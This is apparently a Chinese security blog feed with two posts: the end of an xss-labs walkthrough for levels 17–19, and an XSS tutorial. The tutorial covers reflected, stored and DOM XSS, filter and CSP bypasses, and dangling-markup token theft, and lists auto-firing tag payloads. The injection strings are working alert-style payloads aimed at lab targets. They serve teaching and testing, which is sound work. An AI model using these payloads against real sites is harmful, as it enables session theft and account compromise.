class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>对比发现，虽然加了该死的html转义，但是这里不需要闭合符号，传入的参数都出现在了embed标签上，打开后缀名为swf的文件（FLASH插件的文件，现在很多浏览器都不支持FLASH插件了）</p><blockquote><p>我们来看看embed标签是啥</p><p><img src="/assets/8e2658aa1bb8638d2e015289b78acae5-20250425112244-r9g0vo4.png" alt="8e2658aa1bb8638d2e015289b78acae5"></p><p>embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域</p><p>  再看一下onfocus和onclick事件，这两事件是等价的，都是一触即发</p><p><img src="/assets/29243f1cc2cf0b40aff9cedfdc6dabcb-20250425112251-taa72up.png" alt="29243f1cc2cf0b40aff9cedfdc6dabcb"></p><p>支持的标签范围还广，也就是支持embed标签 ，这里呢我们可以尝试插入该标签</p><p>  再看一下onmouse系列的事件</p><p><img src="/assets/bdc8e30b3de88a19cd87a03f2301e800-20250425112300-rsez2hl.png" alt="bdc8e30b3de88a19cd87a03f2301e800"></p><p>跟onfocus事件支持的标签一样</p></blockquote><p>所以，这题的解法很简单，首先得用一个支持flash插件的浏览器打开本关（打开后会有个图片出来的，不支持flash插件浏览器就没有），如果不想下载的话，自己去后端改一下也行，将后端第十七关的代码（level17.php）指向的swf文件改为index.png</p><p><img src="/assets/f7deb8757696c967421ee46c08a7491f-20250425112309-etizka8.png" alt="f7deb8757696c967421ee46c08a7491f"></p><p>改为：</p><p><img src="/assets/2fe0ec3ec283a7d7a851d2b7efbee91b-20250425112319-wrm7dkb.png" alt="2fe0ec3ec283a7d7a851d2b7efbee91b"></p><p>这样我们再去打开第十七关的网站</p><p>就有个embed标签的区域在啦，其实用不用swf文件都一样的，主要是区域，接着我们构造payload</p><blockquote><p>​<code>?arg02= onclick=alert()</code>​</p></blockquote><p>尽管这里的embed标签无法显示，但是我们还是可以通过构造embed属性的方式来利用本关。并且，在本关中src属性竟然没有引号！这无疑给我们的利用带来了很大的便利。因此，结合上述分析，构造Payload如下所示：</p><blockquote><p>​<code>?arg01=a&amp;arg02=123%20onmouseover=alert(1)</code>​</p></blockquote><p>‍</p><p><strong>本关小结</strong>：emm，貌似就是熟悉一下触发事件（如onclick、onmouseover）的使用</p><hr><h1 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h1><p>这次不改后端代码了，换个支持flash插件的浏览器，Cent Browser。</p><p> 先看一下源码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level18<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level18<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf02.swf?a</span>=<span class="hljs-string">b</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>源码跟上关差别不大，就是换了个swf文件，我们直接测试一波过滤了啥，构建payload</p><blockquote><p>​<code>?arg02=&quot; &#39; sRc DaTa OnFocus &lt;sCriPt&gt; &lt;a hReF=javascript:alert()&gt;;</code>​</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">        <span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;</span><br><span class="language-javascript">            <span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript">        &#125;</span><br><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level18<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level18<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">xsf02.swf?</span>=<span class="hljs-string">&amp;quot;</span> &#x27; <span class="hljs-attr">sRc</span> <span class="hljs-attr">DaTa</span> <span class="hljs-attr">OnFocus</span> &lt;<span class="hljs-attr">sCriPt</span>&gt;</span> <span class="hljs-symbol">&amp;lt;</span>a hReF=javascript:alert()<span class="hljs-symbol">&amp;gt;</span>; width=100% heigth=100%&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>emmm，也是只搞了个html实体化函数，也没过滤啥，感觉跟上关一样，用事件触发属性即可（如onmouse系列、onfocus、onclick等）直接上payload</p><blockquote><p>​<code>?arg02= onmousedown=alert()</code>​</p></blockquote><blockquote><p>​<code>?arg01=a&amp;arg02=123%20onmouseover=alert(1)</code>​</p></blockquote><p>看一下后端源码</p><p><img src="/assets/a12ece3d97365774dd08aac84f41fcfa-20250425113404-9tf1c9u.png" alt="a12ece3d97365774dd08aac84f41fcfa"></p><p>就这点过滤。。。。<br>  <strong>本关小结</strong>：跟上一关一样，无！</p><hr><h1 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-comment">&lt;!--STATUS OK--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;content-type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript"><span class="hljs-variable language_">window</span>.<span class="hljs-property">alert</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)  </span><br><span class="language-javascript">&#123;     </span><br><span class="language-javascript"><span class="hljs-title function_">confirm</span>(<span class="hljs-string">&quot;完成的不错！&quot;</span>);</span><br><span class="language-javascript"> <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;level20.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="language-javascript">&#125;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>欢迎来到level19<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">align</span>=<span class="hljs-string">center</span>&gt;</span>欢迎来到level19<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">embed</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;xsf03.swf?=&quot;</span> <span class="hljs-attr">width</span>=<span class="hljs-string">100%</span> <span class="hljs-attr">heigth</span>=<span class="hljs-string">100%</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>网页源码差不多，也就是只有swf文件不同的差别，直接上payload</p><blockquote><p>​<code>?arg02= onmouseup=alert()</code>​</p></blockquote></script></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
      <category>XSS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>XSS</tag>
      
      <tag>labs</tag>
      
      <tag>实战</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从0到1完全掌握XSS</title>
    <link href="/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/"/>
    <url>/2024/05/20/Web/XSS/%E4%BB%8E0%E5%88%B01%E5%AE%8C%E5%85%A8%E6%8E%8C%E6%8F%A1%20XSS/</url>
    
    <content type="html"><![CDATA[<h1 id="从0到1完全掌握-XSS"><a href="#从0到1完全掌握-XSS" class="headerlink" title="从0到1完全掌握 XSS"></a>从0到1完全掌握 XSS</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本人二刷 XSS，在一刷的时候是以漏洞挖掘与漏洞利用为主，实际上完全对于实战根本没有概念，出去工作一段时间之后才算是拿出来应用。写这篇文章是打算再好好地梳理一遍 XSS。</p><blockquote><p>XSS 的本质是一种高级钓鱼手法。</p></blockquote><h2 id="0x02-什么是-XSS"><a href="#0x02-什么是-XSS" class="headerlink" title="0x02 什么是 XSS"></a>0x02 什么是 XSS</h2><p>XSS (Cross Site Scripting) 攻击全称<strong>跨站脚本攻击</strong>，是为不和<strong>层叠样式表</strong> (Cascading Style Sheets, CSS) 的缩写混淆，故将跨站脚本攻击缩写为 XSS。<br>XSS 是一种经常出现在 Web 应用中的计算机安全漏洞，它允许<strong>恶意 Web 用户</strong>将代码植入到提供给<strong>其它用户使用的页面</strong>中。</p><ul><li>XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。代码长这样。</li></ul><p><img src="/.com//image-20250519114353-hnupv1m.png" alt="image"></p><h2 id="0x03-XSS-的危害"><a href="#0x03-XSS-的危害" class="headerlink" title="0x03 XSS 的危害"></a>0x03 XSS 的危害</h2><p>前文我们说 XSS 本质上来说是一种钓鱼攻击，所以 XSS 的危害角度上也是以钓鱼能够造成的危害为主。</p><h2 id="0x04-XSS-简单应用场景举例"><a href="#0x04-XSS-简单应用场景举例" class="headerlink" title="0x04 XSS 简单应用场景举例"></a>0x04 XSS 简单应用场景举例</h2><p>这里我想先介绍 XSS 的应用方法，如此一来讲起来不会太空洞，也能与下面的攻击手段有所呼应。以反射型 XSS 为例，原理图如下。</p><p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image">​</p><ul><li>这里借用国光师傅的图片进行分析</li></ul><p><img src="/.com//image-20250519114457-xl4w7mw.png" alt="image"></p><p>这是一个恶意的 QQ 空间钓鱼网站，我们在输入框内输入username%20<script>alert(document.cookie)</script>，再对登陆的按钮设置一个 href 到真正的 QQ 空间官网。然而当时用户输入的用户名密码已经被攻击者窃取了。</p><hr><h2 id="XSS-基本攻击手段"><a href="#XSS-基本攻击手段" class="headerlink" title="XSS 基本攻击手段"></a>XSS 基本攻击手段</h2><ul><li>XSS 根据效果不同主要分为三种类型</li><li>反射型 XSS，存储型 XSS，DOM 型 XSS</li></ul><p>危害性来说，存储型 XSS &gt;&gt; 反射型 XSS ~= DOM 型 XSS<br>我们接下来细讲一下这三种 XSS 的攻击手段。</p><h3 id="1-反射型-XSS-及绕过手段"><a href="#1-反射型-XSS-及绕过手段" class="headerlink" title="1. 反射型 XSS 及绕过手段"></a>1. 反射型 XSS 及绕过手段</h3><h4 id="1-什么是反射型-XSS"><a href="#1-什么是反射型-XSS" class="headerlink" title="(1) 什么是反射型 XSS"></a>(1) 什么是反射型 XSS</h4><p>反射型 XSS，也叫非持久型 XSS，转瞬即逝。</p><p>利用比较简单，比如在搜索框中，我记得当时 2020 年，b 站的搜索框还是存在 XSS 的，现在没有了。</p><p>反射型 XSS 的 Payload 如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(1)&lt;script&gt;<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519170804-2sjs41c.png" alt="image"></p><p>效果如图所示</p><p><img src="/.com//image-20250519170813-4tfx507.png" alt="image"></p><h5 id="一、当大多数标签被禁止时的绕过"><a href="#一、当大多数标签被禁止时的绕过" class="headerlink" title="一、当大多数标签被禁止时的绕过"></a>一、当大多数标签被禁止时的绕过</h5><blockquote><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked">Lab: Reflected XSS into HTML context with most tags and attributes blocked</a></p></blockquote><p>还是常规的 Fuzz 测试，在尝试 XSS 攻击之后，若失败了就进行 Fuzz 测试，因为无法排除是不是 WAF 过滤了部分关键字。</p><p>探测出来 onresize 标签还是有效的，我们可以通过这一串 Payload 唤起打印服务</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;body <span class="hljs-attribute">onresize</span>=print()&gt;&quot; <span class="hljs-attribute">onload</span>=this.style.width=&#x27;100px&#x27;&gt;<br></code></pre></td></tr></table></figure><p><img src="/.com//image-20250519171044-j7g2u17.png" alt="image"></p><h5 id="二、当事件处理器与-href-被禁用时的绕过"><a href="#二、当事件处理器与-href-被禁用时的绕过" class="headerlink" title="二、当事件处理器与 href 被禁用时的绕过"></a>二、当事件处理器与 href 被禁用时的绕过</h5><ul><li>老样子还是需要 Fuzz 的。如果渗透测试真正遇到这种情况的话，<code>svg</code>​标签的绕过方式还是主流。</li></ul><blockquote><p><a href="https://portswigger.net/web-security/cross-site-scripting/contexts/lab-event-handlers-and-href-attributes-blocked">Lab: Reflected XSS with event handlers and href attributes blocked</a></p></blockquote><p>Payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">animate</span> <span class="hljs-attr">attributeName</span>=<span class="hljs-string">href</span></span><br><span class="hljs-tag">     <span class="hljs-attr">values</span>=<span class="hljs-string">javascript:alert(1)</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">text</span> <span class="hljs-attr">x</span>=<span class="hljs-string">20</span> <span class="hljs-attr">y</span>=<span class="hljs-string">20</span>&gt;</span>Click me<span class="hljs-tag">&lt;/<span class="hljs-name">text</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>还有一些<code>svg</code>​标签的绕过手段</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">animatetransform</span> <span class="hljs-attr">onbegin</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="三、对-script-进行闭合后构造-Payload"><a href="#三、对-script-进行闭合后构造-Payload" class="headerlink" title="三、对 script 进行闭合后构造 Payload"></a>三、对 script 进行闭合后构造 Payload</h5><p>对某些语句中的符号进行闭合。<br>有些 Web 后端代码会通过反斜杠转义，对很多单引号字符进行过滤，那么转义之后的代码就不能进行原 Payload 的作用。</p><ul><li>XSS Insert Into-&gt; JavaScript</li></ul><p>这种 Payload 可以是通过修改 Web 网站内部 JavaScript 来实现的，因为 JavaScript 本身就可以直接执行 alert 方法，无需使用<code>&lt;script&gt;</code>​标签。</p><p>一般的 Payload</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;-alert(document.<span class="hljs-built_in">domain</span>)-&#x27; <br>&#x27;;alert(document.<span class="hljs-built_in">domain</span>)//<br></code></pre></td></tr></table></figure><h5 id="四、绕过-CSP-攻击"><a href="#四、绕过-CSP-攻击" class="headerlink" title="四、绕过 CSP 攻击"></a>四、绕过 CSP 攻击</h5><ul><li>CSP：content security policy，比较严格的防御 XSS 手段。</li></ul><p>它一般在 HTTP 包里面长这样</p><p><img src="/.com//image-20250519171202-sovbupc.png" alt="image"></p><p>CSP通过这样的指令限制只能加载与页面本身相同来源的资源</p><figure class="highlight csp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csp"><span class="hljs-keyword">script-src</span> <span class="hljs-string">&#x27;self&#x27;</span><br></code></pre></td></tr></table></figure><p>通过下面的指令限制只能从指定域中加载资源</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml"><span class="hljs-variable language_">script</span>-src https:<span class="hljs-comment">//scripts.normal-website.com</span><br></code></pre></td></tr></table></figure><p>但是这种允许外部域的做法还是有风险的，如果攻击者可以向其传递恶意脚本也会遭到攻击的。而且应该也同时不信任来自 CDN 的资源，因为也有被投放的风险。CSP 还通过随机数和哈希值来指定可信资源。</p><ul><li>CSP 的指令指定一个随机数，加载脚本的标签也必须有相同的随机数。否则就不执行该脚本。并秉持一次性的原则，避免被猜解。</li><li>CSP 指令可以指定脚本内容的哈希值。不匹配也是不会执行的。</li></ul><h6 id="绕过方式一-悬空标记攻击"><a href="#绕过方式一-悬空标记攻击" class="headerlink" title="绕过方式一 悬空标记攻击"></a>绕过方式一 悬空标记攻击</h6><ul><li>这种和闭合语句的攻击差不多。</li></ul><p>虽然 CSP 通常可以阻止脚本，但是经常不会禁止加载图片资源，这就导致可以利用<code>img</code>​标签窃取 CSRF 令牌。</p><p>有些浏览器比如 chrome，就有内置的悬空标记缓解功能，这个功能可以阻止包含某些字符的请求，比如换行符、未编码的新一行符或者尖括号。还有一些策略更为严格，可以防止所有形式的外部请求。</p><p>但是还是可以通过注入一个 HTML 元素，点击该元素就会将该元素包含的所有内容发送到外部服务器的方式绕过这种策略，这里感觉有点像点击劫持攻击。</p><blockquote><p><a href="https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack">Lab: Reflected XSS protected by very strict CSP, with dangling markup attack</a></p></blockquote><p>首先我们观察一下修改邮箱的表单要提交哪些信息</p><p><img src="/.com//image-20250519171227-fw71hjh.png" alt="image"></p><p>接着利用悬挂标记攻击将 CSRF Token 窃取出来，所以我们这样构造 Payload</p><p><img src="/.com//image-20250519171235-02jsgfn.png" alt="image"></p><p>再然后用 CSRF 盗用 token，再发包即可。</p><h6 id="绕过方式二-对-CSP-限制不严格的情况下攻击"><a href="#绕过方式二-对-CSP-限制不严格的情况下攻击" class="headerlink" title="绕过方式二 对 CSP 限制不严格的情况下攻击"></a>绕过方式二 对 CSP 限制不严格的情况下攻击</h6><ul><li>CSP 是有设置的，若<code>base-url</code>​为空的话，可以通过 token 值来添加新的 CSP 指令。</li></ul><p>Payload</p><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gml">&lt;<span class="hljs-variable language_">script</span>&gt;alert(<span class="hljs-number">1</span>)&lt;/<span class="hljs-variable language_">script</span>&gt;&amp;token=;<span class="hljs-variable language_">script</span>-src-elem <span class="hljs-string">&#x27;unsafe-inline&#x27;</span><br></code></pre></td></tr></table></figure><p>我们使用<code>script-src-elem</code>​对 CSP 进行覆盖，从而进行 XSS 攻击。</p><hr><h3 id="2-存储型-XSS"><a href="#2-存储型-XSS" class="headerlink" title="2. 存储型 XSS"></a>2. 存储型 XSS</h3><p>存储型 XSS 是危害性最大的 XSS 了，它一般出现于评论留言功能处，大致的利用方法与绕过手段与反射型 XSS 很像，原理图如下。</p><p><img src="/.com//image-20250519114421-ekwxctq.png" alt="image"></p><ul><li>如果执行起来也是插入进上下文标签当中，和之前反射型 XSS 的代码图类似，都是没有加任何的过滤手段，如图。</li></ul><p><img src="/.com//image-20250519171316-dariuk1.png" alt="image"></p><p>我们在新增的评论中将 username 构造成 Payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">username=<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>而这一条评论，又会被保存到数组或者是数据库当中(这个看 Web 程序的设计)，就造成了存储型 XSS。</p><ul><li>绕过手段不再逼逼，和反射型 XSS 是异曲同工。</li></ul><hr><h3 id="3-DOM-型-XSS-重点"><a href="#3-DOM-型-XSS-重点" class="headerlink" title="3. DOM 型 XSS(重点!)"></a>3. DOM 型 XSS(重点!)</h3><p>DOM 型的 XSS 是基于文档对象模型 Document Objeet Model，DOM)的一种漏洞。说白了就是那些标签，比如<code>img</code>​，<code>input</code>​等这种类型的 DOM 节点标签而已，而 DOM 型 XSS 打的就是这些。</p><blockquote><p>我个人觉得 DOM 型 XSS 与反射型，存储型 XSS 的区别可谓不是一点半点，虽然有人把 DOM 型 XSS 归结到反射型 XSS 当中，但是我们看下去，会感受到些许不同。</p></blockquote><p>DOM 型 XSS 全部都是由前端进行触发的。所以我们平常如果挖洞，还是很考验代码审计的耐心的。</p><ul><li>我们下面讲几种常见的攻击方式，在这之前，我们先把可以利用的 DOM 节点，以及其 Payload 拉出来。Payload 摘自<a href="https://cloud.tencent.com/developer/article/1838791">HACK 师傅的文章</a></li></ul><h4 id="一些常用的标签与属性"><a href="#一些常用的标签与属性" class="headerlink" title="一些常用的标签与属性"></a><strong>一些常用的标签与属性</strong></h4><p>下面我列举的标签大部分是可以自动触发 js 代码的，无需用户去交互，大部分情况下我们也是希望是自动触发而不是等用户去触发。</p><h5 id="scirpt-标签"><a href="#scirpt-标签" class="headerlink" title="scirpt 标签"></a><strong>scirpt 标签</strong></h5><p>​<code>&lt;script&gt;</code>​标签用于定义客户端脚本，比如 JavaScript。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1);<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">alert</span>(<span class="hljs-string">&quot;xss&quot;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="img-标签"><a href="#img-标签" class="headerlink" title="img 标签"></a><strong>img 标签</strong></h5><p>​<code>&lt;img&gt;</code>​标签定义 HTML 页面中的图像。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(1);&gt;&lt;img <span class="hljs-attribute">src</span>=1 <span class="hljs-attribute">onerror</span>=alert(&quot;xss&quot;);&gt;<br></code></pre></td></tr></table></figure><h5 id="input-标签"><a href="#input-标签" class="headerlink" title="input 标签"></a><strong>input 标签</strong></h5><p>​<code>&lt;input&gt;</code>​标签规定了用户可以在其中输入数据的输入字段。<br>onfocus 事件在对象获得焦点时发生：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure><p>竞争焦点，从而触发 onblur 事件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">onblur</span>=<span class="hljs-string">alert(1)</span> <span class="hljs-attr">autofocus</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">autofocus</span>&gt;</span><br></code></pre></td></tr></table></figure><p>input 标签的 autofocus 属性规定当页面加载时<code>&lt;input&gt;</code>​元素应该自动获得焦点。可以通过 autofocus 属性自动执行本身的 focus 事件，这个向量是使焦点自动跳到输入元素上，触发焦点事件，无需用户去触发：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;input onfocus<span class="hljs-operator">=</span><span class="hljs-string">&quot;alert(1);&quot;</span> autofocus&gt;<br></code></pre></td></tr></table></figure><h5 id="details-标签"><a href="#details-标签" class="headerlink" title="details 标签"></a><strong>details 标签</strong></h5><p>​<code>&lt;details&gt;</code>​标签通过提供用户开启关闭的交互式控件，规定了用户可见的或者隐藏的需求的补充细节。ontoggle 事件规定了在用户打开或关闭<code>&lt;details&gt;</code>​元素时触发：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;details ontoggle<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure><p>使用details 标签的 open 属性触发ontoggle事件，无需用户去点击即可触发：</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;details open ontoggle<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span 